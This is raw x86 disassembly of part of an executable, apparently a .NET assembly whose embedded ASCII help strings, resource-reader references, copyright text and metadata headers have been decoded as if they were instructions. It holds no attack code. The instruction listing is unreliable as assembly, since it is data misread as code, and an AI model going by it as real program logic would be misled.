  404e75:	and    BYTE PTR [eax],ah
  404e77:	and    BYTE PTR [ebx+0x6e],bl
  404e7a:	popa   
  404e7b:	ins    DWORD PTR es:[edi],dx
  404e7c:	gs jae 0x404eef
  404e7f:	popa   
  404e80:	arpl   WORD PTR [ebp+0x2e],sp
  404e83:	pop    ebp
  404e84:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404e88:	jae    0x404ef8
  404e8a:	popa   
  404e8b:	ins    DWORD PTR es:[edi],dx
  404e8c:	and    BYTE PTR gs:[edi+0x66],ch
  404e90:	and    BYTE PTR [ecx+0x6f],bh
  404e93:	jne    0x404f07
  404e95:	and    BYTE PTR [ebx+0x74],dh
  404e98:	jb     0x404f09
  404e9a:	outs   dx,BYTE PTR ds:[esi]
  404e9b:	ins    BYTE PTR es:[di],dx
  404e9d:	jns    0x404ebf
  404e9f:	je     0x404f1a
  404ea1:	jo     0x404f08
  404ea3:	and    BYTE PTR fs:[edx+0x65],dh
  404ea7:	jae    0x404f18
  404ea9:	jne    0x404f1d
  404eab:	arpl   WORD PTR [ebp+0x20],sp
  404eae:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404eb2:	jae    0x404ee2
  404eb4:	or     eax,0x2020200a
  404eb9:	and    BYTE PTR [eax],ah
  404ebb:	and    BYTE PTR [eax],ah
  404ebd:	and    BYTE PTR [eax],ah
  404ebf:	and    BYTE PTR [eax],ah
  404ec1:	and    BYTE PTR [eax],ah
  404ec3:	and    BYTE PTR [eax],ah
  404ec5:	and    BYTE PTR [ecx+0x6f],bl
  404ec8:	jne    0x404eea
  404eca:	ins    DWORD PTR es:[edi],dx
  404ecb:	popa   
  404ecc:	jns    0x404eee
  404ece:	outs   dx,BYTE PTR ds:[esi]
  404ecf:	gs gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  404ed6:	jb     0x404f3d
  404ed8:	outs   dx,BYTE PTR ds:[esi]
  404ed9:	popa   
  404eda:	ins    DWORD PTR es:[edi],dx
  404edb:	and    BYTE PTR gs:[ecx+0x6f],bh
  404edf:	jne    0x404f53
  404ee1:	and    BYTE PTR [edi+0x75],ch
  404ee4:	je     0x404f56
  404ee6:	jne    0x404f5c
  404ee8:	and    BYTE PTR [esi+0x69],ah
  404eeb:	ins    BYTE PTR es:[edi],dx
  404eec:	and    BYTE PTR gs:[edx+0x65],ah
  404ef0:	outs   dx,WORD PTR ds:[esi]
  404ef2:	jb     0x404f59
  404ef4:	and    BYTE PTR [ebp+0x73],dh
  404ef7:	imul   ebp,DWORD PTR [esi+0x67],0x20746920
  404efe:	outs   dx,DWORD PTR ds:[esi]
  404eff:	jb     0x404f0e
  404f01:	or     ah,BYTE PTR [eax]
  404f03:	and    BYTE PTR [eax],ah
  404f05:	and    BYTE PTR [eax],ah
  404f07:	and    BYTE PTR [eax],ah
  404f09:	and    BYTE PTR [eax],ah
  404f0b:	and    BYTE PTR [eax],ah
  404f0d:	and    BYTE PTR [eax],ah
  404f0f:	and    BYTE PTR [eax],ah
  404f11:	and    BYTE PTR [ebp+0x6d],ah
  404f14:	bound  esp,QWORD PTR [ebp+0x64]
  404f17:	imul   ebp,DWORD PTR fs:[esi+0x67],0x20746920
  404f1f:	imul   ebp,DWORD PTR [esi+0x74],0x6e61206f
  404f26:	and    BYTE PTR [ecx+0x73],ah
  404f29:	jae    0x404f90
  404f2b:	ins    DWORD PTR es:[edi],dx
  404f2c:	bound  ebp,QWORD PTR [ecx+edi*2+0x2e]
  404f30:	and    BYTE PTR ds:0x73752f0a,cl
  404f36:	gs push ebx
  404f38:	outs   dx,DWORD PTR ds:[esi]
  404f39:	jne    0x404fad
  404f3b:	arpl   WORD PTR [ebp+0x50],sp
  404f3e:	popa   
  404f3f:	je     0x404fa9
  404f41:	and    BYTE PTR [eax],ah
  404f43:	push   ebp
  404f44:	jae    0x404fab
  404f46:	and    BYTE PTR [ebp+0x61],ah
  404f49:	arpl   WORD PTR [eax+0x20],bp
  404f4c:	jae    0x404fbd
  404f4e:	jne    0x404fc2
  404f50:	arpl   WORD PTR [ebp+0x20],sp
  404f53:	imul   bp,WORD PTR [ebp+eiz*2+0x27],0x2073
  404f5a:	imul   esi,DWORD PTR fs:[edx+0x65],0x726f7463
  404f62:	jns    0x404f84
  404f64:	popa   
  404f65:	jae    0x404f87
  404f67:	je     0x404fd1
  404f69:	and    BYTE PTR gs:[ebx+0x75],ah
  404f6d:	jb     0x404fe1
  404f6f:	outs   dx,BYTE PTR gs:[esi]
  404f71:	je     0x404f93
  404f73:	imul   esi,DWORD PTR fs:[edx+0x65],0x726f7463
  404f7b:	jns    0x404f8a
  404f7d:	or     ah,BYTE PTR [eax]
  404f7f:	and    BYTE PTR [eax],ah
  404f81:	and    BYTE PTR [eax],ah
  404f83:	and    BYTE PTR [eax],ah
  404f85:	and    BYTE PTR [eax],ah
  404f87:	and    BYTE PTR [eax],ah
  404f89:	and    BYTE PTR [eax],ah
  404f8b:	and    BYTE PTR [eax],ah
  404f8d:	and    BYTE PTR [esi+0x6f],ah
  404f90:	jb     0x404fb2
  404f92:	jb     0x404ff9
  404f94:	jae    0x405005
  404f96:	ins    BYTE PTR es:[edi],dx
  404f97:	jbe    0x405002
  404f99:	outs   dx,BYTE PTR ds:[esi]
  404f9a:	and    BYTE PTR [bp+si+0x65],dh
  404f9e:	ins    BYTE PTR es:[edi],dx
  404f9f:	popa   
  404fa0:	je     0x40500b
  404fa2:	jbe    0x405009
  404fa4:	and    BYTE PTR [esi+0x69],ah
  404fa7:	ins    BYTE PTR es:[edi],dx
  404fa8:	and    BYTE PTR gs:[eax+0x61],dh
  404fac:	je     0x405016
  404fae:	jae    0x404fde
  404fb0:	or     eax,0x75702f0a
  404fb5:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404fb9:	inc    ebx
  404fba:	ins    BYTE PTR es:[edi],dx
  404fbb:	popa   
  404fbc:	jae    0x405031
  404fbe:	and    BYTE PTR [eax],ah
  404fc0:	and    BYTE PTR [eax],ah
  404fc2:	inc    ebx
  404fc3:	jb     0x40502a
  404fc5:	popa   
  404fc6:	je     0x40502d
  404fc8:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404fcc:	and    BYTE PTR [ebx+0x74],dh
  404fcf:	jb     0x405040
  404fd1:	outs   dx,BYTE PTR ds:[esi]
  404fd2:	ins    BYTE PTR es:[di],dx
  404fd4:	jns    0x404ff6
  404fd6:	je     0x405051
  404fd8:	jo     0x40503f
  404fda:	and    BYTE PTR fs:[edx+0x65],dh
  404fde:	jae    0x40504f
  404fe0:	jne    0x405054
  404fe2:	arpl   WORD PTR [ebp+0x20],sp
  404fe5:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404fe9:	jae    0x40500b
  404feb:	popa   
  404fec:	jae    0x40500e
  404fee:	popa   
  404fef:	and    BYTE PTR [eax+0x75],dh
  404ff2:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404ff6:	and    BYTE PTR [ebx+0x6c],ah
  404ff9:	popa   
  404ffa:	jae    0x40506f
  404ffc:	cs or  eax,0x2020200a
  405002:	and    BYTE PTR [eax],ah
  405004:	and    BYTE PTR [eax],ah
  405006:	and    BYTE PTR [eax],ah
  405008:	and    BYTE PTR [eax],ah
  40500a:	and    BYTE PTR [eax],ah
  40500c:	and    BYTE PTR [eax],ah
  40500e:	and    BYTE PTR [eax+ebp*2+0x69],dl
  405012:	jae    0x405034
  405014:	outs   dx,DWORD PTR ds:[esi]
  405015:	jo     0x40508b
  405017:	imul   ebp,DWORD PTR [edi+0x6e],0x20736920
  40501e:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  405025:	and    BYTE PTR [ecx+0x66],ch
  405028:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40502c:	and    BYTE PTR [edi],ch
  40502e:	jae    0x4050a4
  405030:	jb     0x40506c
  405032:	and    BYTE PTR [edi+0x70],ch
  405035:	je     0x4050a0
  405037:	outs   dx,DWORD PTR ds:[esi]
  405038:	outs   dx,BYTE PTR ds:[esi]
  405039:	and    BYTE PTR [ecx+0x73],ch
  40503c:	and    BYTE PTR [esi+0x6f],ch
  40503f:	je     0x405061
  405041:	jne    0x4050b6
  405043:	gs fs cs or eax,0x3a722f0a
  40504b:	cmp    al,0x61
  40504d:	jae    0x4050c2
  40504f:	gs ins DWORD PTR es:[edi],dx
  405051:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  405055:	and    BYTE PTR [eax],ah
  405057:	and    BYTE PTR [edi+ebp*2+0x61],cl
  40505b:	and    BYTE PTR fs:[ecx+edi*2+0x70],dh
  405060:	gs jae 0x405083
  405063:	data16 jb 0x4050d5
  405066:	ins    DWORD PTR es:[edi],dx
  405067:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40506b:	jae    0x4050d2
  40506d:	and    BYTE PTR [ecx+0x73],ah
  405070:	jae    0x4050d7
  405072:	ins    DWORD PTR es:[edi],dx
  405073:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  405077:	jae    0x4050a7
  405079:	and    BYTE PTR [ecx+0x20],al
  40507c:	push   edx
  40507d:	gs jae 0x4050d8
  405080:	and    BYTE PTR [esi+0x69],ah
  405083:	ins    BYTE PTR es:[edi],dx
  405084:	and    BYTE PTR gs:[edi+0x69],dh
  405088:	je     0x4050f2
  40508a:	and    BYTE PTR [ecx+0x20],ah
  40508d:	jo     0x405101
  40508f:	gs jbe 0x4050fb
  405092:	outs   dx,DWORD PTR ds:[esi]
  405093:	jne    0x405108
  405095:	or     eax,0x2020200a
  40509a:	and    BYTE PTR [eax],ah
  40509c:	and    BYTE PTR [eax],ah
  40509e:	and    BYTE PTR [eax],ah
  4050a0:	and    BYTE PTR [eax],ah
  4050a2:	and    BYTE PTR [eax],ah
  4050a4:	and    BYTE PTR [eax],ah
  4050a6:	and    BYTE PTR [esi+0x65],dh
  4050a9:	jb     0x40511e
  4050ab:	imul   ebp,DWORD PTR [edi+0x6e],0x20666f20
  4050b2:	popa   
  4050b3:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4050b7:	and    BYTE PTR gs:[edi+0x69],dh
  4050bb:	ins    BYTE PTR es:[edi],dx
  4050bc:	ins    BYTE PTR es:[edi],dx
  4050bd:	and    BYTE PTR [ebp+0x73],dh
  4050c0:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  4050c5:	and    BYTE PTR [edi+0x6e],ch
  4050c8:	and    BYTE PTR gs:[ecx+0x6e],ch
  4050cc:	and    BYTE PTR [eax+ebp*2+0x69],dh
  4050d0:	jae    0x4050f2
  4050d2:	popa   
  4050d3:	jae    0x405148
  4050d5:	gs ins DWORD PTR es:[edi],dx
  4050d7:	bound  ebp,QWORD PTR [ecx+edi*2+0x2c]
  4050db:	and    BYTE PTR [edi+0x68],dh
  4050de:	outs   dx,BYTE PTR gs:[esi]
  4050e0:	and    BYTE PTR [ebx+0x65],dh
  4050e3:	je     0x405113
  4050e5:	or     eax,0x2e0a0d0a
  4050ea:	je     0x405164
  4050ec:	je     0x40510e
  4050ee:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6820
  4050f5:	popa   
  4050f6:	jbe    0x40515d
  4050f8:	and    BYTE PTR [eax+ebp*2+0x69],dh
  4050fc:	jae    0x40511e
  4050fe:	outs   dx,WORD PTR ds:[esi]
  405100:	jb     0x40516f
  405102:	popa   
  405103:	je     0x40513f
  405105:	or     eax,0x200a0d0a
  40510a:	and    BYTE PTR [eax],ah
  40510c:	and    BYTE PTR [ebx],ah
  40510e:	and    BYTE PTR [ebp+0x73],dl
  405111:	and    BYTE PTR gs:[ebx],ah
  405114:	and    BYTE PTR [ecx+0x74],ah
  405117:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40511b:	and    BYTE PTR [edx+0x65],ah
  40511e:	imul   ebp,DWORD PTR [bp+0x6e],0x20676e69
  405126:	outs   dx,DWORD PTR ds:[esi]
  405127:	data16 and BYTE PTR [ecx+0x20],ah
  40512b:	ins    BYTE PTR es:[edi],dx
  40512c:	imul   ebp,DWORD PTR [esi+0x65],0x726f6620
  405133:	and    BYTE PTR [ecx+0x20],ah
  405136:	arpl   WORD PTR [edi+0x6d],bp
  405139:	ins    DWORD PTR es:[edi],dx
  40513a:	outs   dx,BYTE PTR gs:[esi]
  40513c:	je     0x40515e
  40513e:	arpl   WORD PTR [eax+0x61],bp
  405141:	jb     0x4051a4
  405143:	arpl   WORD PTR [ebp+eiz*2+0x72],si
  405147:	cs or  eax,0x2020200a
  40514d:	and    BYTE PTR [esi+0x61],ch
  405150:	ins    DWORD PTR es:[edi],dx
  405151:	gs cmp eax,0x756c6176
  405157:	gs or  eax,0x2020200a
  40515d:	and    BYTE PTR [ebp+0x6f],ch
  405160:	jb     0x4051c7
  405162:	and    BYTE PTR [ebp+0x6c],ah
  405165:	popa   
  405166:	bound  ebp,QWORD PTR [edi+0x72]
  405169:	popa   
  40516a:	je     0x4051d1
  40516c:	and    BYTE PTR [esi+0x61],ch
  40516f:	ins    DWORD PTR es:[edi],dx
  405170:	gs cmp eax,0x756c6176
  405176:	gs or  eax,0x4c38010a
  40517c:	popa   
  40517d:	outs   dx,BYTE PTR ds:[esi]
  40517e:	addr16 jne 0x4051e2
  405181:	and    BYTE PTR gs:[bp+0x61],ch
  405186:	ins    DWORD PTR es:[edi],dx
  405187:	gs jae 0x4051aa
  40518a:	jbe    0x4051ed
  40518c:	ins    BYTE PTR es:[edi],dx
  40518d:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x7420726f
  405195:	push   0x732f2065
  40519a:	je     0x40520e
  40519c:	cmp    bh,BYTE PTR [esp+ebp*2]
  40519f:	popa   
  4051a0:	outs   dx,BYTE PTR ds:[esi]
  4051a1:	addr16 jne 0x405205
  4051a4:	gs and BYTE PTR ds:[bx+0x70],ch
  4051aa:	je     0x405215
  4051ac:	outs   dx,DWORD PTR ds:[esi]
  4051ad:	outs   dx,BYTE PTR ds:[esi]
  4051ae:	and    BYTE PTR [ecx+0x72],ah
  4051b1:	cmp    al,BYTE PTR gs:[ecx]
  4051b4:	adc    BYTE PTR [ebx+0x30],bh
  4051b7:	jge    0x4051d9
  4051b9:	ja     0x40521c
  4051bb:	jb     0x40522b
  4051bd:	imul   ebp,DWORD PTR [esi+0x67],0x29732873
  4051c4:	add    DWORD PTR cs:[eax],esp
  4051c7:	inc    ebx
  4051c8:	outs   dx,DWORD PTR ds:[esi]
  4051c9:	jne    0x405237
  4051cb:	outs   dx,BYTE PTR fs:[esi]
  4051cd:	daa    
  4051ce:	je     0x4051f0
  4051d0:	ja     0x405244
  4051d2:	imul   esi,DWORD PTR [ebp+eiz*2+0x20],0x7074756f
  4051da:	jne    0x405250
  4051dc:	and    BYTE PTR [esi+0x69],ah
  4051df:	ins    BYTE PTR es:[edi],dx
  4051e0:	and    BYTE PTR gs:[edx],ah
  4051e3:	jnp    0x405215
  4051e5:	jge    0x405209
  4051e7:	add    dl,al
  4051e9:	add    DWORD PTR [eax],eax
  4051eb:	add    dh,cl
  4051ed:	retf   0xbeef
  4051f0:	add    DWORD PTR [eax],eax
  4051f2:	add    BYTE PTR [eax],al
  4051f4:	xchg   ecx,eax
  4051f5:	add    BYTE PTR [eax],al
  4051f7:	add    BYTE PTR [ebx+edx*2+0x79],ch
  4051fb:	jae    0x405271
  4051fd:	gs ins DWORD PTR es:[edi],dx
  4051ff:	cs push edx
  405201:	gs jae 0x405273
  405204:	jne    0x405278
  405206:	arpl   WORD PTR [ebp+0x73],sp
  405209:	cs push edx
  40520b:	gs jae 0x40527d
  40520e:	jne    0x405282
  405210:	arpl   WORD PTR [ebp+0x52],sp
  405213:	gs popa 
  405215:	fs gs jb 0x405245
  405219:	and    BYTE PTR [ebp+0x73],ch
  40521c:	arpl   WORD PTR [edi+0x72],bp
  40521f:	ins    BYTE PTR es:[edi],dx
  405220:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  405227:	jae    0x405292
  405229:	outs   dx,DWORD PTR ds:[esi]
  40522a:	outs   dx,BYTE PTR ds:[esi]
  40522b:	cmp    eax,0x2e302e32
  405230:	xor    BYTE PTR [esi],ch
  405232:	xor    BYTE PTR [eax+eiz*1],ch
  405235:	inc    ebx
  405236:	jne    0x4052a4
  405238:	je     0x4052af
  40523a:	jb     0x4052a1
  40523c:	cmp    eax,0x7475656e
  405241:	jb     0x4052a4
  405243:	ins    BYTE PTR es:[edi],dx
  405244:	sub    al,0x20
  405246:	push   eax
  405247:	jne    0x4052ab
  405249:	ins    BYTE PTR es:[edi],dx
  40524a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  405251:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  405255:	bound  esi,QWORD PTR [edi]
  405257:	aaa    
  405258:	popa   
  405259:	xor    eax,0x31363563
  40525e:	cmp    DWORD PTR [ebx],esi
  405260:	xor    al,0x65
  405262:	xor    BYTE PTR [eax],bh
  405264:	cmp    DWORD PTR [ebx],esp
  405266:	push   ebx
  405267:	jns    0x4052dc
  405269:	je     0x4052d0
  40526b:	ins    DWORD PTR es:[edi],dx
  40526c:	cs push edx
  40526e:	gs jae 0x4052e0
  405271:	jne    0x4052e5
  405273:	arpl   WORD PTR [ebp+0x73],sp
  405276:	cs push edx
  405278:	jne    0x4052e8
  40527a:	je     0x4052e5
  40527c:	ins    DWORD PTR es:[edi],dx
  40527d:	gs push edx
  40527f:	gs jae 0x4052f1
  405282:	jne    0x4052f6
  405284:	arpl   WORD PTR [ebp+0x53],sp
  405287:	gs je  0x40528c
  40528a:	add    BYTE PTR [eax],al
  40528c:	add    BYTE PTR [edx],al
  40528e:	add    BYTE PTR [eax],al
  405290:	add    BYTE PTR [eax],al
  405292:	add    BYTE PTR [eax],al
  405294:	add    BYTE PTR [eax+0x41],dl
  405297:	inc    esp
  405298:	push   eax
  405299:	inc    ecx
  40529a:	inc    esp
  40529b:	push   eax
  40529c:	cmp    DWORD PTR [ebx+0x33092f78],ecx
  4052a2:	adc    BYTE PTR [esi+0x4d],0x0
  4052a6:	add    BYTE PTR [eax],al
  4052a8:	add    BYTE PTR [eax],al
  4052aa:	add    BYTE PTR [eax],al
  4052ac:	push   edx
  4052ad:	add    DWORD PTR [eax],eax
  4052af:	add    BYTE PTR [eax+0x4d],cl
  4052b2:	add    BYTE PTR [ecx+0x0],ch
  4052b5:	arpl   WORD PTR [eax],ax
  4052b7:	jb     0x4052b9
  4052b9:	outs   dx,DWORD PTR ds:[esi]
  4052ba:	add    BYTE PTR [ebx+0x0],dh
  4052bd:	outs   dx,DWORD PTR ds:[esi]
  4052be:	add    BYTE PTR [esi+0x0],ah
  4052c1:	je     0x4052c3
  4052c3:	pop    edi
  4052c4:	add    BYTE PTR [ebx+0x0],al
  4052c7:	outs   dx,DWORD PTR ds:[esi]
  4052c8:	add    BYTE PTR [eax+0x0],dh
  4052cb:	jns    0x4052cd
  4052cd:	jb     0x4052cf
  4052cf:	imul   eax,DWORD PTR [eax],0x680067
  4052d5:	je     0x4052d7
  4052d7:	pop    edi
  4052d8:	add    BYTE PTR [ebx+0x0],al
  4052db:	outs   dx,DWORD PTR ds:[esi]
  4052dc:	add    BYTE PTR [ebp+0x0],ch
  4052df:	ins    DWORD PTR es:[edi],dx
  4052e0:	add    BYTE PTR [ecx+0x0],ah
  4052e3:	outs   dx,BYTE PTR ds:[esi]
  4052e4:	add    BYTE PTR [eax+eax*1+0x4c],ah
  4052e8:	add    BYTE PTR [ecx+0x0],ch
  4052eb:	outs   dx,BYTE PTR ds:[esi]
  4052ec:	add    BYTE PTR [ebp+0x0],ah
  4052ef:	pop    edi
  4052f0:	add    BYTE PTR [eax+eax*1+0x6f],cl
  4052f4:	add    BYTE PTR [edi+0x0],ah
  4052f7:	outs   dx,DWORD PTR ds:[esi]
  4052f8:	add    BYTE PTR [eax],al
  4052fa:	add    BYTE PTR [eax],al
  4052fc:	add    BYTE PTR [edi+edx*2],bh
  4052ff:	add    BYTE PTR [ebx+0x0],al
  405302:	inc    esi
  405303:	add    BYTE PTR [edi+0x0],bl
  405306:	push   esp
  405307:	add    BYTE PTR [edx+0x0],dh
  40530a:	popa   
  40530b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40530f:	add    BYTE PTR [ebp+0x0],ch
  405312:	popa   
  405313:	add    BYTE PTR [edx+0x0],dh
  405316:	imul   eax,DWORD PTR [eax],0x5f
  405319:	add    BYTE PTR [ebx+0x0],al
  40531c:	outs   dx,DWORD PTR ds:[esi]
  40531d:	add    BYTE PTR [ebp+0x0],ch
  405320:	ins    DWORD PTR es:[edi],dx
  405321:	add    BYTE PTR [ecx+0x0],ah
  405324:	outs   dx,BYTE PTR ds:[esi]
  405325:	add    BYTE PTR [eax+eax*1+0x4c],ah
  405329:	add    BYTE PTR [ecx+0x0],ch
  40532c:	outs   dx,BYTE PTR ds:[esi]
  40532d:	add    BYTE PTR [ebp+0x0],ah
  405330:	pop    edi
  405331:	add    BYTE PTR [eax+eax*1+0x6f],cl
  405335:	add    BYTE PTR [edi+0x0],ah
  405338:	outs   dx,DWORD PTR ds:[esi]
  405339:	add    BYTE PTR [eax+eax*1],bh
  40533c:	add    BYTE PTR [eax],al
  40533e:	add    DWORD PTR [edx],edi
  405340:	inc    ebx
  405341:	outs   dx,DWORD PTR ds:[esi]
  405342:	jo     0x4053bd
  405344:	jb     0x4053af
  405346:	addr16 push 0x63282074
  40534c:	sub    DWORD PTR [eax],esp
  40534e:	dec    ebp
  40534f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405356:	je     0x405378
  405358:	inc    ebx
  405359:	outs   dx,DWORD PTR ds:[esi]
  40535a:	jb     0x4053cc
  40535c:	outs   dx,DWORD PTR ds:[esi]
  40535d:	jb     0x4053c0
  40535f:	je     0x4053ca
  405361:	outs   dx,DWORD PTR ds:[esi]
  405362:	outs   dx,BYTE PTR ds:[esi]
  405363:	and    BYTE PTR cs:[eax],ah
  405366:	inc    ecx
  405367:	ins    BYTE PTR es:[edi],dx
  405368:	ins    BYTE PTR es:[edi],dx
  405369:	and    BYTE PTR [edx+0x69],dh
  40536c:	addr16 push 0x72207374
  405372:	gs jae 0x4053da
  405375:	jb     0x4053ed
  405377:	gs fs add DWORD PTR cs:[edx],esi
  40537c:	dec    ebp
  40537d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405384:	je     0x4053a6
  405386:	sub    BYTE PTR [edx+0x29],dl
  405389:	and    BYTE PTR [edi+0x69],dl
  40538c:	outs   dx,BYTE PTR ds:[esi]
  40538d:	outs   dx,DWORD PTR fs:[esi]
  40538f:	ja     0x405404
  405391:	and    BYTE PTR [eax],ch
  405393:	push   edx
  405394:	sub    DWORD PTR [eax],esp
  405396:	inc    ebx
  405397:	outs   dx,DWORD PTR ds:[esi]
  405398:	ins    DWORD PTR es:[edi],dx
  405399:	ins    DWORD PTR es:[edi],dx
  40539a:	jne    0x40540a
  40539c:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4053a3:	and    BYTE PTR [esi+0x6f],al
  4053a6:	jne    0x405416
  4053a8:	fs popa 
  4053aa:	je     0x405415
  4053ac:	outs   dx,DWORD PTR ds:[esi]
  4053ad:	outs   dx,BYTE PTR ds:[esi]
  4053ae:	add    BYTE PTR [eax],al
  4053b0:	inc    edx
  4053b1:	push   ebx
  4053b2:	dec    edx
  4053b3:	inc    edx
  4053b4:	add    DWORD PTR [eax],eax
  4053b6:	add    DWORD PTR [eax],eax
  4053b8:	add    BYTE PTR [eax],al
  4053ba:	add    BYTE PTR [eax],al
  4053bc:	or     al,0x0
  4053be:	add    BYTE PTR [eax],al
  4053c0:	jbe    0x4053f4
  4053c2:	xor    BYTE PTR cs:[esi],ch
  4053c5:	xor    eax,0x37323730
  4053ca:	add    BYTE PTR [eax],al
  4053cc:	add    BYTE PTR [eax],al
  4053ce:	add    eax,0x6c00
  4053d3:	add    BYTE PTR [ebp+edx*1+0x7e230000],dh
  4053da:	add    BYTE PTR [eax],al
  4053dc:	and    BYTE PTR [esi],dl
  4053de:	add    BYTE PTR [eax],al
  4053e0:	sub    BYTE PTR [eax],bl
  4053e2:	add    BYTE PTR [eax],al
  4053e4:	and    edx,DWORD PTR [ebx+0x74]
  4053e7:	jb     0x405452
  4053e9:	outs   dx,BYTE PTR ds:[esi]
  4053ea:	addr16 jae 0x4053ed
  4053ed:	add    BYTE PTR [eax],al
  4053ef:	add    BYTE PTR [eax+0x2e],cl
  4053f2:	add    BYTE PTR [eax],al
  4053f4:	mov    al,0x7
  4053f6:	add    BYTE PTR [eax],al
  4053f8:	and    edx,DWORD PTR [ebp+0x53]
  4053fb:	add    al,bh
  4053fd:	xor    eax,0x100000
  405402:	add    BYTE PTR [eax],al
  405404:	and    eax,DWORD PTR [edi+0x55]
  405407:	dec    ecx
  405408:	inc    esp
  405409:	add    BYTE PTR [eax],al
  40540b:	add    BYTE PTR [eax],cl
  40540d:	add    BYTE PTR ss:[eax],al
  405410:	jo     0x405442
  405412:	add    BYTE PTR [eax],al
  405414:	and    eax,DWORD PTR [edx+0x6c]
  405417:	outs   dx,DWORD PTR ds:[esi]
  405418:	bound  eax,QWORD PTR [eax]
  40541a:	add    BYTE PTR [eax],al
  40541c:	add    BYTE PTR [eax],al
  40541e:	add    BYTE PTR [eax],al
  405420:	add    al,BYTE PTR [eax]
  405422:	add    BYTE PTR [ecx],al
  405424:	push   edi
  405425:	sbb    eax,0xb0909a2
  40542a:	add    BYTE PTR [eax],al
  40542c:	add    dl,bh
  40542e:	add    DWORD PTR [ebx],esi
  405430:	add    BYTE PTR [esi],dl
  405432:	add    BYTE PTR [eax],al
  405434:	add    DWORD PTR [eax],eax
  405436:	add    BYTE PTR [eax],al
  405438:	push   edi
  405439:	add    BYTE PTR [eax],al
  40543b:	add    BYTE PTR [ecx],dl
  40543d:	add    BYTE PTR [eax],al
  40543f:	add    BYTE PTR [ebp+0x40000000],bl
  405445:	add    BYTE PTR [eax],al
  405447:	add    BYTE PTR [eax+0x0],bl
  40544a:	add    BYTE PTR [eax],al
  40544c:	mov    eax,ds:0x87000000
  405451:	add    BYTE PTR [eax],al
  405453:	add    BYTE PTR [eax+eax*1],dl
  405456:	add    BYTE PTR [eax],al
  405458:	adc    eax,DWORD PTR [eax]
  40545a:	add    BYTE PTR [eax],al
  40545c:	push   es
  40545d:	add    BYTE PTR [eax],al
  40545f:	add    BYTE PTR [edi],cl
  405461:	add    BYTE PTR [eax],al
  405463:	add    BYTE PTR [eax],dl
  405465:	add    BYTE PTR [eax],al
  405467:	add    BYTE PTR [edx],al
  405469:	add    BYTE PTR [eax],al
  40546b:	add    BYTE PTR [ecx],al
  40546d:	add    BYTE PTR [eax],al
  40546f:	add    BYTE PTR ds:0x2000000,al
  405475:	add    BYTE PTR [eax],al
  405477:	add    BYTE PTR ds:0x1000000,al
  40547d:	add    BYTE PTR [eax],al
  40547f:	add    BYTE PTR [eax],al
  405481:	add    BYTE PTR [edx],cl
  405483:	add    BYTE PTR [ecx],al
  405485:	add    BYTE PTR [eax],al
  405487:	add    BYTE PTR [eax],al
  405489:	add    BYTE PTR [esi],al
  40548b:	add    BYTE PTR [ebx],cl
  40548d:	add    DWORD PTR [ecx+0x28000a00],ebp
  405493:	add    DWORD PTR [edx],edx
  405495:	add    DWORD PTR [edx],ecx
  405497:	add    BYTE PTR ds:0x6011201,bh
  40549d:	add    BYTE PTR [ecx+0x1],bl
  4054a0:	dec    edi
  4054a1:	add    DWORD PTR [esi],eax
  4054a3:	add    BYTE PTR [esi+0x1],ah
  4054a6:	test   eax,0x70000600
  4054ab:	add    DWORD PTR [ecx-0x13fffa00],ebp
  4054b1:	add    eax,0x605db
  4054b6:	ror    DWORD PTR [eax],cl
  4054b8:	mov    esi,0x5a000608
  4054bd:	or     al,BYTE PTR [edi+0xa]
  4054c0:	push   es
  4054c1:	add    BYTE PTR [edx+ecx*1+0x47],ah
  4054c5:	or     al,BYTE PTR [esi]
  4054c7:	add    BYTE PTR [edx+ecx*1+0x60a81],bl
  4054ce:	mov    ch,0xa
  4054d0:	mov    ds:0x2e00060a,eax
  4054d5:	or     esp,DWORD PTR [ebx+0x3700060a]
  4054db:	or     ebp,DWORD PTR [ecx-0x6cfffa00]
  4054e1:	or     ebx,ebx
  4054e3:	add    eax,0xbc40006
  4054e8:	fild   DWORD PTR ds:0xcdd0006
  4054ee:	ror    DWORD PTR [esi+eax*1],1
  4054f1:	add    dh,ah
  4054f3:	or     al,0x4f
  4054f5:	add    DWORD PTR [esi],eax
  4054f7:	add    BYTE PTR [ebp+0x600a90d],ah
  4054fd:	add    dh,ch
  4054ff:	push   cs
  405500:	iret   
  405501:	push   cs
  405502:	push   es
  405503:	add    dl,bh
  405505:	push   cs
  405506:	iret   
  405507:	push   cs
  405508:	push   es
  405509:	add    BYTE PTR [ebx],dl
  40550b:	bswap  edi
  40550d:	push   cs
  40550e:	push   es
  40550f:	add    BYTE PTR [edi],ah
  405511:	pop    gs
  405513:	add    BYTE PTR [esi],al
  405515:	add    BYTE PTR ds:0x60aa30f,bh
  40551b:	add    BYTE PTR [edi+ecx*1-0x5d],dl
  40551f:	or     al,BYTE PTR [esi]
  405521:	add    BYTE PTR [ecx+0xf],dh
  405524:	mov    ds:0x8f00060a,eax
  405529:	bt     DWORD PTR [edx],ecx
  40552c:	push   es
  40552d:	add    BYTE PTR [eax+0x60aa30f],ch
  405533:	add    cl,al
  405535:	bt     DWORD PTR [edx],ecx
  405538:	push   es
  405539:	add    ah,bl
  40553b:	bt     DWORD PTR [edx],ecx
  40553e:	push   es
  40553f:	add    ch,dh
  405541:	bt     DWORD PTR [edx],ecx
  405544:	push   es
